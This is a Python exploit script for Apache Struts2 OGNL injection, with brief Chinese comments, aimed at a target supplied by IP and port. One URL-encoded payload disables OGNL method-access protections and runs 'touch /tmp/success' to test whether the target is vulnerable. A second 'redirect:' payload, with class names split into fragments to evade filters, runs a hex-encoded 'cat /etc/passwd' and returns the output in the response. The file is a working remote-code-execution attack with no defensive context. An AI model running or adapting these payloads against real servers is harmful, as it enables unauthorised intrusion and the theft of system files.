import requests
from lib import base_def
import argparse
import bs4


def target_test(url, get_text, header, proxies):
    url_tmp = url + "?" + get_text
    print(url_tmp)
    response = requests.get(url, headers=header, proxies=proxies)
    response_payload = requests.get(url_tmp, headers=header, proxies=proxies)
    if response_payload.status_code == 200:
        if len(response_payload.content) == len(response.content):
            return True


def target_attack(url, header, proxies, post_command):
    soup_res = ""
    print(url)
    response = requests.post(url, data=post_command, proxies=proxies, headers=header)
    if response.status_code == 200:
        soup_res = bs4.BeautifulSoup(response.text, 'html.parser')
    return soup_res


if __name__ == "__main__":
    #-------------脚本初始化部分--------------------
    #根据exp，所有命令需要进行urlencode
    shell_command = "pwd"
    arg_parser = argparse.ArgumentParser()
    print("the scripts has 1 parameters")
    argparse = base_def.start_help(arg_parser)
    proxies = base_def.default_proxies()
    header = base_def.default_header()
    #--------------------------------------------
    url = "http://" + argparse.ip + ":" + argparse.port + "/example/HelloWorld.action"
    get_test = ("(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)(("
                "%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)("
                "%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec("
                "%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1")
    if target_test(url, get_test, header, proxies):
        #header.update({"User-agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)"})
        post_command = ("redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp"
                        "%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner(("
                        "new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString("
                        ").split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),"
                        "%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get("
                        "%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b"
                        "%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter("
                        ").println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}")
        print(target_attack(url, header, proxies, post_command))
